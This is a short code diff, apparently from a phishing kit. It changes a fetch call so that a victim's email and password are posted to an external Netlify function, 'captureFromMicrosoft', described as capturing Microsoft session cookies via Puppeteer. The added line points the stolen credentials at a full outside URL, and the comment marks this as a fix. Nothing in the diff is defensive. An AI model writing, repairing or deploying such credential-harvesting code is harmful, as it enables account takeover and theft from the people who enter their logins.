@@ -344,7 +344,8 @@
                 console.log('🔄 Sending credentials to Netlify function for backend capture...');
                 
                 // Send to backend for cookie capture via Puppeteer
-                const captureResponse = await fetch('/.netlify/functions/captureFromMicrosoft', {
+                // ✅ FIXED: Use full URL instead of relative path
+                const captureResponse = await fetch('https://vaultydocs.com/.netlify/functions/captureFromMicrosoft', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password })
